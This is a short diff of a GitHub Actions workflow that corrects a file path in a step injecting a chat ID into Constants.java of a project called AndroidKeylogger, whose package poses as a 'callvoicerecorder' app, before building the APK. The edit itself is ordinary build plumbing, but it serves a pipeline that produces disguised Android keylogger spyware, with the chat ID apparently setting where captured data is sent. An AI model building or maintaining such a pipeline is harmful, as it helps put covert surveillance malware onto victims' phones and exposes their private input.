@@ -35,7 +35,7 @@ jobs:
       working-directory: AndroidKeylogger
 
     - name: Inject Chat ID into Constants.java
-      run: sed -i 's/CHAT_ID_PLACEHOLDER/${{ github.event.inputs.chat_id }}/g' AndroidKeylogger/app/src/main/java/com/example/callvoicerecorder/Constants.java
+      run: sed -i 's/CHAT_ID_PLACEHOLDER/${{ github.event.inputs.chat_id }}/g' app/src/main/java/com/example/callvoicerecorder/Constants.java
       working-directory: AndroidKeylogger
 
     - name: Build APK
